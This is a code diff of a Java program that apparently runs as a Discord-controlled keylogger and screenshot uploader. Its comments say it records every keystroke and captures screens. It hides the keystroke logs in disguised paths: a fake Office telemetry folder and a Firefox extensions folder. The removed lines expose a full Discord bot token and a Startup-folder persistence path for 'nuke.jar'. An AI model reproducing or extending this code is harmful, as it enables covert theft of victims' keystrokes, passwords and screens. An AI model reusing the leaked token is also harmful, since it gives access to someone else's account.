@@ -25,15 +25,21 @@ import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Main implements NativeKeyListener{
 	
+	
+	// This code here is for .ss start [which automatically takes screenshots and uploads them]
+	// it takes a picture and places them in a directory.
 	static Date cd = new Date();
 	static SimpleDateFormat date = new SimpleDateFormat("MM/dd/yyyy");
 	static SimpleDateFormat time = new SimpleDateFormat("hh:mm:ss");
+
 	
-	private static String token = "MTE3OTE1NDY5MjcxMDg3NTIxOA.GDxMjH.Vh3p2ILsoMDwlqhID1mJ7ZZJ92IMizKx9iCzH4";
+	private static String token = "XXX";
+	
+	// This code records all of your keys typed, and places them in a specific directory. DO NOT USE THIS MALICIOUSLY.
 	public  final Path windowsFile = Paths.get("C:\\Users"+System.getProperty("user.name")+"\\AppData\\Local\\Microsoft\\Office\\OTele\\env6"+System.getProperty("user.name")+".txt");
 	public  final Path linuxFile = Paths.get("/home/chillydogs/.mozilla/extensions/env6"+System.getProperty("user.name")+".txt");
-	// /usr/bin/env6.txt
-	// "C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nuke.jar"
+	
+
 	
 	public final File windows = new File("C:\\");
 	public final File linux = new File("/home");
